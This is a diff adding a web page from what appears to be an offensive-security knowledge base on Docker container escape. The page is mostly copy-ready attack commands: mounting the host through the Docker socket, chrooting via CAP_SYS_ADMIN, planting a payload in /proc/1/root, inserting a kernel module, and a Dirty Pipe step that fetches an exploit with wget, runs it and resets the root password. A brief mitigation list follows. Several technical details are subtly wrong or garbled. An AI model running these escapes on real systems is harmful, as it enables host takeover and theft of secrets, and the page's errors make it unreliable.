@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Docker Container Escape | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../cloud/index.html">Cloud</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="../cloud/index.html">Cloud</a> / Container Escape
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical | ATT&CK T1611</span>
+      <h1>🐳 Docker Container Escape</h1>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Container escape techniques allow attackers to break out of Docker containers and gain access to the underlying host system. This is critical for containerized workloads as it provides full system compromise.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why Container Escape is Critical:</strong>
+        <ul>
+          <li>Full host system access from container</li>
+          <li>Access to all containers on the same host</li>
+          <li>Cluster-wide compromise via node access</li>
+          <li>Extract secrets from host filesystem</li>
+          <li>Persistence on infrastructure</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 2. DOCKER SOCKET -->
+    <div class="content-section" id="socket">
+      <h2>🔌 Docker Socket Escape</h2>
+      
+      <p><strong>The Docker Socket:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if docker socket is mounted
+ls -la /var/run/docker.sock
+
+# If mounted, escape to host
+docker run -v /:/host alpine chroot /host sh</pre>
+      </div>
+
+      <p><strong>Alternative Sockets:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check for other sockets
+find / -name '*.sock' -type s 2>/dev/null
+
+# containerd socket
+ls -la /run/containerd/containerd.sock
+
+# crio socket
+ls -la /var/run/crio/crio.sock</pre>
+      </div>
+    </div>
+
+    <!-- 3. SHARED NAMESPACE -->
+    <div class="content-section" id="namespace">
+      <h2>🏠 Shared Namespace Escape</h2>
+      
+      <p><strong>Host Network Namespace Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check network namespace
+cat /proc/1/net/ipv6route
+
+# Access host network
+ip link set myeth0 up
+ip addr add 10.0.0.100/24 dev myeth0
+
+# Port scanning from container
+nmap -sV 10.0.0.1/24</pre>
+      </div>
+
+      <p><strong>PID Namespace Escape:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If PID namespace not isolated
+cat /proc/1/cmdline
+ps aux
+
+# Write to host process
+echo "malicious_code" > /proc/1/root/tmp/payload.sh</pre>
+      </div>
+    </div>
+
+    <!-- 4. CAPSYSADMIN -->
+    <div class="content-section" id="caps">
+      <h2>👑 CAP_SYS_ADMIN Exploit</h2>
+      
+      <p><strong>Check Capabilities:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check current capabilities
+cat /proc/self/status | grep Cap
+capsh --print
+
+# If CAP_SYS_ADMIN is present, mount host filesystem
+mkdir -p /tmp/c
+mount /dev/sda1 /tmp/c
+chroot /tmp/c</pre>
+      </div>
+
+      <p><strong>Proof of Concept:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>#!/bin/bash
+# Container escape via CAP_SYS_ADMIN
+
+# Create device file
+mknod /tmp/hostdev c 8 0 2>/dev/null
+
+# Mount host filesystem
+mount /dev/sda1 /tmp/hostdir 2>/dev/null
+
+# If successful, chroot to host
+if [ -d "/tmp/hostdir/etc" ]; then
+    chroot /tmp/hostdir /bin/bash
+fi</pre>
+      </div>
+    </div>
+
+    <!-- 5. VOLUME MOUNT -->
+    <div class="content-section" id="volume">
+      <h2>📁 Privileged Container / Volume Mount</h2>
+      
+      <p><strong>Check if Privileged:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check privileged status
+cat /proc/self/status | grep SeLinux
+dmesg | grep -i security
+
+# Try to mount
+mount /dev/sda1 /tmp/escape 2>&1</pre>
+      </div>
+
+      <p><strong>Host Rootfs Mount:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If / is mounted as volume
+cat /proc/1/mounts | grep -E "^/dev"
+
+# Mount the host root
+mkdir -p /tmp/host
+mount /dev/sda1 /tmp/host
+chroot /tmp/host /bin/bash</pre>
+      </div>
+    </div>
+
+    <!-- 6. SYSMODULE -->
+    <div class="content-section" id="sysmodule">
+      <h2🔧 Sys module Escape</h2>
+      
+      <p><strong>Load Kernel Module:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if /sys is writable
+ls -la /sys/module
+
+# Write to module params
+echo "1" > /sys/module/hidden/parameters/visible
+
+# Or load malicious module (requires key)
+insmod /tmp/hidden.ko</pre>
+      </div>
+    </div>
+
+    <!-- 7. CGROUPS -->
+    <div class="content-section" id="cgroups">
+      <h2>⚙️ Cgroups Escape (Dirty Pipe)</h2>
+      
+      <p><strong>Dirty Pipe Exploitation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check kernel version
+uname -r
+
+# Dirty pipe exploit (CVE-2022-0847)
+wget https://exploit-db.com/dirty-pipe.c
+gcc dirty-pipe.c -o dirty-pipe
+./dirty-pipe /etc/passwd 1
+
+# Now write to any file as root
+echo "root:password" | chpasswd</pre>
+      </div>
+    </div>
+
+    <!-- 8. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      <ul>
+        <li>Root access on host system</li>
+        <li>Access to all containers on the node</li>
+        <li>Kubernetes secret extraction</li>
+        <li>Node-to-cluster lateral movement</li>
+        <li>Data exfiltration from other workloads</li>
+      </ul>
+    </div>
+
+    <!-- 9. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+      
+      <div class="mitigation-box">
+        <strong>✅ Defense Strategies:</strong>
+        <ul>
+          <li>Don't run containers as privileged</li>
+          <li>Drop all capabilities: <code>--cap-drop ALL</code></li>
+          <li>Read-only root filesystem: <code>--read-only</code></li>
+          <li>DisableSYS_MODULE: <code>--sysctl</code></li>
+          <li>Use non-root users in containers</li>
+          <li>Regular CVE patching</li>
+        </ul>
+      </div>
+
+      <p><strong>Secure Container Config:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>docker run --read-only \
+            --cap-drop ALL \
+            --security-opt=no-new-privileges \
+            --network=none \
+            alpine:latest</pre>
+      </div>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1611/" target="_blank">MITRE T1611</a></li>
+        <li><a href="https://github.com/nicholasκ/docker-cheat-sheet" target="_blank">Docker Escape Cheat Sheet</a></li>
+      </ul>
+    </div>
+
+    <a href="../cloud/index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Cloud Security</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+});
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => btn.textContent = 'Copy', 2000);
+}
+</script>
+
+</body>
+</html>
